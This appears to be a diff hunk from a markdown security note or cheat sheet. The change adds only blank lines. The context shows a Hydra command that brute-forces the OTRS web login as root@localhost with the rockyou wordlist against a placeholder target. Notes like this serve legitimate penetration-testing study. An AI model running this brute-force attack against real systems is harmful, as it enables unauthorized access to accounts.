@@ -19,3 +19,5 @@ updated_at: '2023-05-29T16:48:52.884824+00:00'
 hydra -l root@localhost -P /usr/share/wordlists/rockyou.txt target-ip http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=-60&User=^USER^&Password=^PASS^: Login failed!"
 
 ```
+
+
